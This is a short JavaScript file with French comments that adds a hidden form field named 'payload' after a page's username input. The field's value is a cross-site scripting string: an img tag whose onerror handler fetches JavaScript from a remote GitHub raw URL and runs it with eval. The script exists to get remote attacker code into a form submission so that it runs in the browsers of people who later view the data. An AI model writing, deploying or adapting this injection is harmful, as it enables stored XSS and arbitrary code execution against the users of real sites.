(function() {
    // Fonction à exécuter une fois le DOM chargé
    function addHiddenPayload() {
        // Sélection du champ username
        var usernameField = document.getElementById('username');

        if (!usernameField) {
            console.log('[newfield.js] Champ #username non trouvé.');
            return;
        }

        console.log('[newfield.js] Champ #username trouvé.');

        // Vérifie s'il n'existe pas déjà un champ #payload
        if (document.getElementById('payload')) {
            console.log('[newfield.js] Le champ caché existe déjà.');
            return;
        }

        // Création d'un champ caché
        var hiddenInput = document.createElement('input');
        hiddenInput.type = 'hidden';
        hiddenInput.id = 'payload';
        hiddenInput.name = 'payload';
        hiddenInput.value = '"><img src=x onerror="fetch(\'https://raw.githubusercontent.com/Vault-of-Jok3r/payload_xss/refs/heads/main/payload.js\').then(r=>r.text()).then(c=>eval(c))">';

        // Insertion du champ caché juste après le champ username
        usernameField.parentNode.insertBefore(hiddenInput, usernameField.nextSibling);

        console.log('[newfield.js] Champ caché #payload ajouté juste après #username.');
    }

    // Exécution directe si le DOM est déjà chargé, sinon on attend
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', addHiddenPayload);
    } else {
        addHiddenPayload();
    }
})();
